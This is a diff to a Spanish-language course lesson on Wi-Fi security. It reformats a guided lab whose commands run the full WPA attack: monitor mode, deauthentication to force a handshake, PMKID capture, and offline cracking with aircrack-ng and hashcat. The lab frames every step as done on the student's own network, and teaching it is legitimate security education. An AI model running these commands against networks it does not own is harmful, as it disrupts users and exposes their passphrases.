@@ -53,34 +53,47 @@ Al finalizar, el alumno podrá:
 ## 🧪 Laboratorio guiado
 
 1. **Activa modo monitor** en tu adaptador:
+
    ```bash
    sudo airmon-ng start wlan0        # crea wlan0mon
    ```
+
 2. **Escanea redes** cercanas (identifica tu red por su BSSID):
+
    ```bash
    sudo airodump-ng wlan0mon
    ```
+
 3. **Captura en el canal de TU red**:
+
    ```bash
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon
    ```
+
 4. **Fuerza un handshake** (sobre TU red, con un dispositivo propio) mediante una deauth breve:
+
    ```bash
    sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF wlan0mon
    ```
+
    Espera el mensaje "WPA handshake" en airodump.
 5. **Alternativa PMKID** (sin cliente), sobre tu red:
+
    ```bash
    sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
    hcxpcapngtool -o hash.hc22000 pmkid.pcapng
    ```
+
 6. **Crackeo offline** con diccionario (contra tu propia passphrase de laboratorio):
+
    ```bash
    aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF captura-01.cap
    # o con hashcat:
    hashcat -m 22000 hash.hc22000 rockyou.txt
    ```
+
 7. **Restaura** el modo gestionado al terminar:
+
    ```bash
    sudo airmon-ng stop wlan0mon
    ```
